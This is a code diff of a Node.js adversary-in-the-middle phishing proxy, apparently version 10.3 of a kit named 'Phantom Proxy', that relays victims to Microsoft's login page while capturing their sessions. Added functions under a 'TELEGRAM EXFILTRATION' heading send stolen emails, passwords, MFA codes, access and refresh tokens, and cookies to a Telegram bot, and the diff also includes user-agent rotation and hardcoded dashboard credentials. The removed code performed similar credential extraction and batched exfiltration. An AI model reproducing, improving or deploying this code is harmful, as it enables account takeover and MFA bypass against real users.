@@ -1,21 +1,38 @@
+// ============================================================
+// 🥔 PHANTOM PROXY v10.3 — FIXED SW REGISTRATION
+// ============================================================
+// 🔥 NO EXPRESS — pure Node.js
+// ✅ All features + Service Worker injection
+// ============================================================
+
 const http = require("http");
 const https = require("https");
 const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
+const os = require("os");
 
-// ==================== UTILITY: ESCAPE MARKDOWN ====================
-function escapeMarkdown(text) {
-    if (!text) return '';
-    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-}
+// ── ✅ SAFE REQUIRE ──
+let axios, AdmZip, WebSocket, FormData;
+try { axios = require('axios'); } catch (e) { axios = null; }
+try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
+try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
+try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ==================== CONFIGURATION ====================
+// ── ✅ TELEGRAM CONFIG ──
+const BOT_TOKEN = '';
+const CHAT_ID = '';
+
+// ── ✅ DASHBOARD AUTH ──
+const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
+const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';
+
+// ── ✅ CONSTANTS ──
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
-const REDIRECT_URL = "https://www.intrinsec.com/";
+const REDIRECT_URL = "https://login.microsoftonline.com/";
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -28,263 +45,181 @@ const PROXY_PATHNAMES = {
     script: "/@",
     mutation: "/Mutation_o5y3f4O7jMGW",
     jsCookie: "/JSCookie_6X7dRqLg90mH",
-    favicon: "/favicon.ico",
-    fingerprint: "/fingerprint"
+    favicon: "/favicon.ico"
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-try {
-    if (!fs.existsSync(LOGS_DIRECTORY)) {
-        fs.mkdirSync(LOGS_DIRECTORY);
-    }
-} catch (error) {
-    displayError("Directory creation failed", error, LOGS_DIRECTORY);
-}
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "";
+const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
+const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
+const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
+const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");
+
+if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
+if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
+
 const LOG_FILE_STREAMS = {};
-const ENCRYPTION_KEY = "Svrps-M3g4_S3cURe-EnC4YpT10n_k3Y";
-
 const VICTIM_SESSIONS = {};
+let deviceFlows = [];
+let prtStorage = { prts: [], lastScan: null };
 
-// ==================== TELEGRAM INTEGRATION ====================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-const TELEGRAM_BATCH_INTERVAL_MS = 60000; // 1 minute
-const TELEGRAM_BATCH_MAX_SIZE = 10;
-let telegramBatch = [];
-let telegramBatchTimer = null;
+// ── ✅ CACHE MANAGER ──
+class CacheManager {
+    constructor(ttl = 300000) {
+        this.cache = new Map();
+        this.ttl = ttl;
+        this.hits = 0;
+        this.misses = 0;
+    }
+    get(key) {
+        const item = this.cache.get(key);
+        if (!item) { this.misses++; return null; }
+        if (Date.now() > item.expiry) { this.cache.delete(key); this.misses++; return null; }
+        this.hits++; return item.value;
+    }
+    set(key, value, ttl = null) {
+        const expiry = Date.now() + (ttl || this.ttl);
+        this.cache.set(key, { value, expiry });
+        return value;
+    }
+    clean() {
+        const now = Date.now();
+        for (const [key, item] of this.cache) {
+            if (now > item.expiry) this.cache.delete(key);
+        }
+    }
+}
+global._cache = new CacheManager(300000);
 
-async function sendTelegramMessage(text) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "") {
-        console.warn("Telegram bot token not set. Skipping message.");
+// ── ✅ RETRY LOGIC ──
+async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
+    let lastError;
+    let currentDelay = delay;
+    for (let attempt = 1; attempt <= retries; attempt++) {
+        try { return await fn(); } catch (error) {
+            lastError = error;
+            if (attempt === retries) break;
+            const jitter = Math.random() * 0.3 + 0.85;
+            await new Promise(resolve => setTimeout(resolve, currentDelay * jitter));
+            currentDelay *= backoff;
+        }
+    }
+    throw lastError;
+}
+
+// ── ✅ USER-AGENT ROTATION ──
+const USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+];
+function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
+function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
+
+// ============================================================
+// 📤 TELEGRAM EXFILTRATION
+// ============================================================
+async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
+    if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
+    try {
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `tokens_${sessionId}_${timestamp}.txt`;
+        const filePath = path.join(os.tmpdir(), filename);
+        let content = '# 🔑 FULL TOKENS DUMP\n';
+        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
+        for (const [key, val] of Object.entries(tokens)) {
+            if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
+        }
+        fs.writeFileSync(filePath, content);
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(filePath), { filename });
+        form.append('caption', `🔑 Tokens file: ${filename}`);
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
+        try { fs.unlinkSync(filePath); } catch (e) {}
+        console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
+    } catch (e) { console.error('Telegram tokens file failed:', e.message); }
+}
+
+async function sendCookiesFile(cookies, sessionId) {
+    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
+    try {
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `cookies_${sessionId}_${timestamp}.txt`;
+        const filePath = path.join(os.tmpdir(), filename);
+        let content = '# 🍪 COOKIES DUMP\n';
+        for (const [name, value] of Object.entries(cookies)) content += `${name}=${value}\n`;
+        fs.writeFileSync(filePath, content);
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(filePath), { filename });
+        form.append('caption', `🍪 Cookies: ${filename}`);
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
+        try { fs.unlinkSync(filePath); } catch (e) {}
+        console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
+    } catch (e) { console.error('Telegram cookies file failed:', e.message); }
+}
+
+async function sendToTelegram(data) {
+    if (!axios) {
+        console.error('❌ axios not available, cannot send Telegram.');
         return;
     }
-    // First attempt with Markdown
-    let payload = JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text.slice(0, 4096),
-        parse_mode: "Markdown",
-        disable_web_page_preview: true
-    });
-    let options = {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Content-Length": Buffer.byteLength(payload)
-        }
-    };
-
     try {
-        await new Promise((resolve, reject) => {
-            const req = https.request(TELEGRAM_API_URL, options, (res) => {
-                let data = "";
-                res.on("data", chunk => data += chunk);
-                res.on("end", () => {
-                    if (res.statusCode === 200) {
-                        resolve();
-                    } else if (res.statusCode === 400 && data.includes("can't parse entities")) {
-                        // Retry without Markdown parsing
-                        console.warn("Markdown parse error, retrying without parse_mode");
-                        const fallbackPayload = JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: text.slice(0, 4096),
-                            disable_web_page_preview: true
-                        });
-                        const fallbackOptions = {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                                "Content-Length": Buffer.byteLength(fallbackPayload)
-                            }
-                        };
-                        const fallbackReq = https.request(TELEGRAM_API_URL, fallbackOptions, (fbRes) => {
-                            let fbData = "";
-                            fbRes.on("data", chunk => fbData += chunk);
-                            fbRes.on("end", () => {
-                                if (fbRes.statusCode === 200) {
-                                    resolve();
-                                } else {
-                                    reject(new Error(`Fallback failed: ${fbRes.statusCode} ${fbData}`));
-                                }
-                            });
-                        });
-                        fallbackReq.on("error", reject);
-                        fallbackReq.write(fallbackPayload);
-                        fallbackReq.end();
-                    } else {
-                        reject(new Error(`Status ${res.statusCode} ${data}`));
-                    }
-                });
-            });
-            req.on("error", reject);
-            req.write(payload);
-            req.end();
-        });
-    } catch (error) {
-        displayError("Telegram sendMessage failed", error, text.substring(0, 200));
-    }
-}
+        const sessionId = data.sessionId || 'unknown';
+        const email = data.email || 'N/A';
+        const password = data.password || 'N/A';
+        const mfa = data.mfa || 'N/A';
+        const tokens = data.tokens || {};
+        const cookies = data.cookies || {};
 
-async function flushTelegramBatch() {
-    if (telegramBatch.length === 0) return;
-    const batchCopy = telegramBatch.slice();
-    telegramBatch = [];
-    const message = `📦 *Batch (${batchCopy.length} logs)*\n\n${batchCopy.join("\n---\n")}`;
-    await sendTelegramMessage(message);
-}
+        console.log(`📤 Sending Telegram for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
 
-async function queueTelegramLog(logEntry) {
-    if (TELEGRAM_BATCH_INTERVAL_MS > 0) {
-        telegramBatch.push(logEntry);
-        if (telegramBatch.length >= TELEGRAM_BATCH_MAX_SIZE) {
-            await flushTelegramBatch();
+        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
+        if (Object.keys(tokens).length > 0) {
+            message += '\n\n🔑 Tokens:\n';
+            for (const [k, v] of Object.entries(tokens)) message += `${k}: ${v.slice(0, 30)}...\n`;
+            await sendTokensFile(tokens, sessionId, email, password, mfa);
         }
-        if (!telegramBatchTimer) {
-            telegramBatchTimer = setTimeout(() => {
-                telegramBatchTimer = null;
-                flushTelegramBatch().catch(e => displayError("Batch flush error", e));
-            }, TELEGRAM_BATCH_INTERVAL_MS);
+        if (Object.keys(cookies).length > 0) {
+            message += '\n🍪 Cookies:\n';
+            for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
+            await sendCookiesFile(cookies, sessionId);
         }
-    } else {
-        await sendTelegramMessage(logEntry);
-    }
-}
-
-// ==================== GEO-LOCATION (with cache) ====================
-const geoCache = new Map();
-const GEO_API_URL = "https://ip-api.com/json/"; // FIXED: changed to https
-
-async function getGeoLocation(ip) {
-    if (!ip) return null;
-    if (geoCache.has(ip)) return geoCache.get(ip);
-    try {
-        const url = `${GEO_API_URL}${ip}?fields=status,message,country,regionName,city,isp,lat,lon,timezone`;
-        const data = await new Promise((resolve, reject) => {
-            https.get(url, (res) => {
-                let raw = "";
-                res.on("data", chunk => raw += chunk);
-                res.on("end", () => {
-                    try { resolve(JSON.parse(raw)); } catch (e) { reject(e); }
-                });
-            }).on("error", reject);
-        });
-        if (data.status === "success") {
-            const result = {
-                country: data.country,
-                region: data.regionName,
-                city: data.city,
-                isp: data.isp,
-                lat: data.lat,
-                lon: data.lon,
-                timezone: data.timezone
-            };
-            geoCache.set(ip, result);
-            return result;
-        }
-        geoCache.set(ip, null);
-        return null;
+        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        }, { timeout: 5000 });
+        console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
     } catch (e) {
-        displayError("Geo-location API error", e, ip);
-        geoCache.set(ip, null);
-        return null;
+        console.error('❌ Telegram send failed:', e.message);
+        if (e.response) console.error('   Response data:', e.response.data);
     }
 }
 
-// ==================== CREDENTIAL EXTRACTOR (Request) ====================
-function extractCredentials(body) {
-    if (!body) return null;
-    let parsed = null;
-    let raw = typeof body === "string" ? body : JSON.stringify(body);
-    try {
-        parsed = JSON.parse(raw);
-    } catch {
-        try {
-            parsed = Object.fromEntries(new URLSearchParams(raw));
-        } catch {
-            parsed = { raw: raw };
-        }
-    }
-    const credentialFields = ["username", "user", "email", "login", "userid", "password", "pass", "pwd", "passwd", "secret", "token", "accesstoken", "refresh_token"];
-    const found = {};
-    for (const key of credentialFields) {
-        const lowerKey = key.toLowerCase();
-        for (const [k, v] of Object.entries(parsed)) {
-            if (k.toLowerCase().includes(lowerKey) || lowerKey.includes(k.toLowerCase())) {
-                if (v && typeof v === "string" && v.length > 0 && v.length < 500) {
-                    found[k] = v;
-                }
-            }
-        }
-    }
-    return Object.keys(found).length ? found : null;
-}
-
-// ==================== RESPONSE TOKEN EXTRACTOR ====================
-function extractResponseTokens(body, contentType) {
-    if (!body) return null;
-    let parsed = null;
-    try {
-        if (contentType && contentType.includes('application/json')) {
-            parsed = typeof body === 'string' ? JSON.parse(body) : body;
-        } else {
-            const str = body.toString();
-            const tokenPatterns = {
-                'access_token': /["']access_token["']\s*:\s*["']([^"']+)["']/i,
-                'refresh_token': /["']refresh_token["']\s*:\s*["']([^"']+)["']/i,
-                'code': /["']code["']\s*:\s*["']([^"']+)["']/i,
-                'id_token': /["']id_token["']\s*:\s*["']([^"']+)["']/i,
-                'session_state': /["']session_state["']\s*:\s*["']([^"']+)["']/i,
-                'state': /["']state["']\s*:\s*["']([^"']+)["']/i,
-                'token': /["']token["']\s*:\s*["']([^"']+)["']/i,
-            };
-            const found = {};
-            for (const [name, regex] of Object.entries(tokenPatterns)) {
-                const match = str.match(regex);
-                if (match) found[name] = match[1];
-            }
-            return Object.keys(found).length ? found : null;
-        }
-    } catch (e) {
-        return null;
-    }
-    const tokenFields = ['access_token', 'refresh_token', 'id_token', 'code', 'session_state', 'state', 'token'];
-    const found = {};
-    for (const field of tokenFields) {
-        if (parsed && parsed[field]) {
-            found[field] = parsed[field];
-        }
-    }
-    return Object.keys(found).length ? found : null;
-}
-
-// ==================== EXISTING UTILITY FUNCTIONS ====================
-function displayError(message, error, ...args) {
-    console.error("******************************");
-    console.error(`${message}: ${error.name ?? error}`);
-    console.error(`Message: ${error.message}`);
-    console.error(`Stack trace: ${error.stack}`);
-    for (let i = 0; i < args.length; i++) {
-        console.error(`Parameter ${i + 1}: ${args[i]}`);
-    }
-    console.error("******************************");
-}
-
+// ============================================================
+// 🧩 PROXY HELPERS
+// ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
     const cookies = requestCookies.split("; ");
     for (const cookie of cookies) {
-        const [cookieName, ...cookieValue] = cookie.split("=");
-        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
-            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
-            return cookieName;
-        }
+        const [name, ...val] = cookie.split("=");
+        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
     }
     return;
 }
 
 function generateRandomString(length) {
-    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
 }
 
 function createSessionLogFile(logFilename, currentSession) {
@@ -296,15 +231,26 @@ function createSessionLogFile(logFilename, currentSession) {
 function generateNewSession(phishedURL) {
     const cookieName = generateRandomString(12);
     const cookieValue = generateRandomString(32);
-    VICTIM_SESSIONS[cookieName] = {};
-    VICTIM_SESSIONS[cookieName].value = cookieValue;
-    VICTIM_SESSIONS[cookieName].cookies = [];
-    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
-    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
-    return {
-        cookieName: cookieName,
-        cookieValue: cookieValue
+    VICTIM_SESSIONS[cookieName] = {
+        value: cookieValue,
+        cookies: [],
+        protocol: phishedURL.protocol,
+        hostname: phishedURL.hostname,
+        path: phishedURL.pathname + phishedURL.search,
+        port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
+        host: phishedURL.host,
+        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`
     };
+    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
+    return { cookieName, cookieValue };
+}
+
+function displayError(message, error, ...args) {
+    console.error("******************************");
+    console.error(`${message}: ${error.name || error}`);
+    console.error(`Message: ${error.message}`);
+    for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
+    console.error("******************************");
 }
 
 async function encryptData(data) {
@@ -313,18 +259,15 @@ async function encryptData(data) {
         const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
         const encryptedData = [];
         cipher.on("error", reject)
-               .on("data", chunk => encryptedData.push(chunk))
-               .on("end", () => resolve({
-                    iv: iv.toString("hex"),
-                    encryptedData: Buffer.concat(encryptedData).toString("hex")
-               }));
+              .on("data", chunk => encryptedData.push(chunk))
+              .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
         cipher.write(data, "utf-8");
         cipher.end();
     });
 }
 
-async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession, clientRequest) {
-    const httpProxyTransaction = {
+async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
+    const transaction = {
         timestamp: new Date().toISOString(),
         proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
         proxyRequestMethod: proxyRequestOptions.method,
@@ -334,132 +277,27 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         proxyResponseHeaders: proxyResponse.headers
     };
     const logFileStream = LOG_FILE_STREAMS[currentSession];
-    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));
-    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
+    const encrypted = await encryptData(JSON.stringify(transaction));
+    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
-    }
-
-    // ---------- TELEGRAM ENHANCED LOGGING ----------
-    try {
-        let clientIP = clientRequest.socket.remoteAddress;
-        const forwarded = clientRequest.headers["x-forwarded-for"];
-        if (forwarded) {
-            const forwardedIPs = forwarded.split(",").map(ip => ip.trim());
-            clientIP = forwardedIPs[0] || clientIP;
-        }
-        if (clientIP && clientIP.startsWith("::ffff:")) {
-            clientIP = clientIP.substring(7);
-        }
-
-        const userAgent = clientRequest.headers["user-agent"] || "unknown";
-        const geo = await getGeoLocation(clientIP);
-        let geoStr = "N/A";
-        if (geo) {
-            geoStr = `${geo.city}, ${geo.region}, ${geo.country} (${geo.isp}) [${geo.lat},${geo.lon}]`;
-        }
-
-        let summary = 
-`🕒 *${escapeMarkdown(httpProxyTransaction.timestamp)}*
-🌐 *${escapeMarkdown(httpProxyTransaction.proxyRequestMethod)}* ${escapeMarkdown(httpProxyTransaction.proxyRequestURL)}
-📊 Status: ${httpProxyTransaction.proxyResponseStatusCode}
-📦 Session: ${escapeMarkdown(currentSession)}
-📁 Host: ${escapeMarkdown(proxyRequestOptions.headers.host)}
-👤 *Client IP:* ${escapeMarkdown(clientIP || "unknown")}
-📍 *Geo:* ${escapeMarkdown(geoStr)}
-📱 *User-Agent:* ${escapeMarkdown(userAgent)}
-🍪 Cookies: ${proxyRequestOptions.headers.cookie ? "✅ present" : "❌ none"}`;
-
-        // Critical Headers
-        const criticalHeaders = ['accept-language', 'sec-ch-ua', 'sec-ch-ua-platform', 'sec-fetch-site', 'sec-fetch-mode', 'origin', 'referer'];
-        let headerStr = '';
-        for (const h of criticalHeaders) {
-            if (clientRequest.headers[h]) headerStr += `\n📎 *${escapeMarkdown(h)}*: \`${escapeMarkdown(clientRequest.headers[h])}\``;
-        }
-        if (headerStr) summary += `\n\n📋 *CRITICAL HEADERS:*${headerStr}`;
-
-        // URL Parameters
-        try {
-            const urlObj = new URL(`${proxyRequestProtocol}//${clientRequest.headers.host}${clientRequest.url}`);
-            const queryParams = Object.fromEntries(urlObj.searchParams);
-            if (Object.keys(queryParams).length) {
-                const qStr = Object.entries(queryParams).map(([k,v]) => `🔗 *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
-                summary += `\n\n🔍 *URL PARAMETERS:*\n${qStr}`;
-            }
-        } catch {}
-
-        // All session cookies - with date validation
-        const allCookies = VICTIM_SESSIONS[currentSession]?.cookies || [];
-        if (allCookies.length) {
-            const cookieStr = allCookies.map(c => {
-                let expiresStr = 'unknown';
-                if (c.expires && !isNaN(c.expires) && isFinite(c.expires)) {
-                    try {
-                        expiresStr = new Date(c.expires).toISOString();
-                    } catch (_) { expiresStr = 'invalid'; }
-                }
-                return `🍪 *${escapeMarkdown(c.name)}* = \`${escapeMarkdown(c.value)}\` (domain: ${escapeMarkdown(c.domain)}, path: ${escapeMarkdown(c.path)}, expires: ${escapeMarkdown(expiresStr)})`;
-            }).join("\n");
-            summary += `\n\n📦 *SESSION COOKIES (${allCookies.length}):*\n${cookieStr}`;
-        }
-
-        // Auth tokens from headers
-        const authHeaders = ['authorization', 'x-api-key', 'x-csrf-token', 'x-xsrf-token', 'x-requested-with'];
-        let authStr = '';
-        for (const h of authHeaders) {
-            if (clientRequest.headers[h]) authStr += `\n🔐 *${escapeMarkdown(h)}*: \`${escapeMarkdown(clientRequest.headers[h])}\``;
-        }
-        if (authStr) summary += `\n\n🛡️ *AUTH TOKENS:*${authStr}`;
-
-        // Request body and extracted credentials
-        if (proxyRequestBody) {
-            let bodyStr = typeof proxyRequestBody === "string" ? proxyRequestBody : JSON.stringify(proxyRequestBody);
-            if (bodyStr.length > 200) bodyStr = bodyStr.substring(0, 200) + "... (truncated)";
-            summary += `\n\n📦 *Request Body:*\n\`\`\`\n${escapeMarkdown(bodyStr)}\n\`\`\``;
-
-            const creds = extractCredentials(proxyRequestBody);
-            if (creds) {
-                const credStr = Object.entries(creds).map(([k, v]) => `🔑 *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
-                summary += `\n\n🔥 *EXTRACTED CREDENTIALS:*\n${credStr}`;
-            }
-        }
-
-        // Redirect location
-        if (proxyResponse.headers.location) {
-            summary += `\n\n↪️ *Redirect Location:* \`${escapeMarkdown(proxyResponse.headers.location)}\``;
-        }
-
-        // Timing
-        const startTime = clientRequest._startTime || Date.now();
-        const duration = Date.now() - startTime;
-        summary += `\n\n⏱️ *Request duration:* ${duration}ms`;
-
-        await queueTelegramLog(summary);
-    } catch (e) {
-        displayError("Telegram enhanced logging error", e);
     }
 }
 
-// ==================== DOMAIN / PATH HELPERS ====================
+// ── Cookie management (unchanged) ──
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
-    const splitRequestHostname = requestHostname.split(".");
-    const splitCookieDomain = cookieDomain.split(".");
-    if (splitCookieDomain.length < 2) return false;
-    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) return false;
-    if (splitRequestHostname.length < splitCookieDomain.length) return false;
-    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
-        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) return false;
-    }
+    const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
+    if (sCookie.length < 2) return false;
+    if (cookieHostOnly && sReq.length !== sCookie.length) return false;
+    if (sReq.length < sCookie.length) return false;
+    for (let i = 1; i < sCookie.length + 1; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
     return true;
 }
 
 function isPathApplicable(requestPath, cookiePath) {
-    const splitRequestPath = requestPath.split("/");
-    const splitCookiePath = cookiePath.split("/");
+    const sReq = requestPath.split("/"), sCookie = cookiePath.split("/");
     if (cookiePath === "/") return true;
-    if (splitRequestPath.length < splitCookiePath.length) return false;
-    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
-        if (splitCookiePath[i] !== splitRequestPath[i]) return false;
-    }
+    if (sReq.length < sCookie.length) return false;
+    for (let i = 1; i < sCookie.length; i++) if (sCookie[i] !== sReq[i]) return false;
     return true;
 }
 
@@ -469,357 +307,1608 @@ function isCookieApplicable(requestOptions, cookie) {
 }
 
 function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
-    const proxyRequestCookies = {};
-    const currentTimestamp = Date.now();
+    const cookieMap = {};
+    const now = Date.now();
     for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
-        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
-            proxyRequestCookies[cookie.name] = cookie.value;
+        if (!(now > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
+            cookieMap[cookie.name] = cookie.value;
         }
     }
-    return Object.entries(proxyRequestCookies)
-        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
-        .join("; ");
+    return Object.entries(cookieMap).map(([n, v]) => `${n}=${v}`).join("; ");
 }
 
 function parseCookieDate(cookieDate) {
     let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
-    let hourValue, minuteValue, secondValue;
-    let dayValue, monthValue, yearValue;
-    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
-    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);
-    for (const token of dateTokens) {
+    let h, m, s, day, month, year;
+    const tokens = cookieDate.split(/[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/).filter(t => t);
+    for (const token of tokens) {
         if (!foundTime) {
-            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
-            if (timeMatch) {
-                foundTime = true;
-                hourValue = parseInt(timeMatch[1]);
-                minuteValue = parseInt(timeMatch[2]);
-                secondValue = parseInt(timeMatch[3]);
-                continue;
-            }
+            const tm = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
+            if (tm) { foundTime = true; h = parseInt(tm[1]); m = parseInt(tm[2]); s = parseInt(tm[3]); continue; }
         }
         if (!foundDay) {
-            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
-            if (dayMatch) {
-                foundDay = true;
-                dayValue = parseInt(dayMatch[1]);
-                continue;
-            }
+            const dm = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
+            if (dm) { foundDay = true; day = parseInt(dm[1]); continue; }
         }
         if (!foundMonth) {
-            const monthLowerCase = token.toLowerCase();
-            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];
+            const months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
             for (let i = 0; i < months.length; i++) {
-                if (monthLowerCase.startsWith(months[i])) {
-                    foundMonth = true;
-                    monthValue = i;
-                    break;
-                }
+                if (token.toLowerCase().startsWith(months[i])) { foundMonth = true; month = i; break; }
             }
             if (foundMonth) continue;
         }
         if (!foundYear) {
-            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
-            if (yearMatch) {
-                foundYear = true;
-                yearValue = parseInt(yearMatch[1]);
-                continue;
-            }
+            const ym = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
+            if (ym) { foundYear = true; year = parseInt(ym[1]); continue; }
         }
     }
-    if (yearValue >= 70 && yearValue <= 99) yearValue += 1900;
-    else if (yearValue >= 0 && yearValue <= 69) yearValue += 2000;
+    if (year >= 70 && year <= 99) year += 1900; else if (year >= 0 && year <= 69) year += 2000;
     if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
-    if (dayValue < 1 || dayValue > 31) return NaN;
-    if (yearValue < 1601) return NaN;
-    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) return NaN;
-    const parsedCookieDate = new Date(Date.UTC(yearValue, monthValue, dayValue, hourValue, minuteValue, secondValue));
-    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
-        parsedCookieDate.getUTCMonth() !== monthValue ||
-        parsedCookieDate.getUTCDate() !== dayValue) return NaN;
-    return parsedCookieDate.getTime();
